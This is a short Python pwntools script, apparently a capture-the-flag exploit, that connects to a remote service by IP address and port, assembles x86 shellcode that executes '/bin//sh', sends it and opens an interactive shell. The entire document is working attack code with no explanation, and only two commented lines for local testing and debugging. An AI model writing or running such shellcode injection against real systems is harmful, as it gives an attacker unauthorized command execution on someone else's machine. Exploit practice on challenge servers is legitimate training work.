#!/usr/bin/env python
# coding=utf-8
from pwn import *
#a=process("./pwn_1")
#gdb.attach(a,"b *0x80484CF")
a=remote("101.71.29.5",10000)
b="""
mul ecx 
push   ecx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
mov    al,0xb
int    0x80
"""
shellcode_x86=asm(b)

a.send(shellcode_x86)
a.interactive()
